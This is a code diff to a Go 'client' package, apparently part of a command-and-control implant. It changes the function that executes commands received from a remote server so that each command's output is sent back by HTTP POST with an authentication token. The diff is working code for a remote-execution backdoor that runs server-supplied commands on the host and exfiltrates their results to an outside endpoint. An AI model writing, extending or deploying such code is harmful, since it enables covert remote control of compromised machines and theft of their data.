@@ -1,6 +1,7 @@
 package client
 
 import (
+	"bytes"
 	"crypto/tls"
 	"crypto/x509"
 	"errors"
@@ -105,7 +106,7 @@ func RequestCommand(client *http.Client, host string, port int) (string, string)
 
 // ExecAndGetOutput executes the command string on the OS
 // and returns the combined output.
-func ExecAndGetOutput(cmdString string) []byte {
+func ExecAndGetOutput(client *http.Client, url string, cmdString string) {
 	log.Println("[+] Executing cmd...")
 	cmdTokens := strings.Split(cmdString, " ")
 	log.Println(cmdTokens)
@@ -115,7 +116,18 @@ func ExecAndGetOutput(cmdString string) []byte {
 		log.Printf("[-] Failed to execute cmd with error: %s\n", err)
 		out = []byte("Failed to execute cmd")
 	}
-	return out
+
+	log.Printf("[+] Sending back output:\n%s\n", string(out))
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(out))
+	if err != nil {
+		log.Printf("[-] Error creating the POST request: %s\n", err)
+		return
+	}
+
+	req.Header.Add("Token", ClientToken)
+	req.Header.Set("Content-Type", "text/html")
+
+	client.Do(req)
 }
 
 func RunClient(host string, port int) {
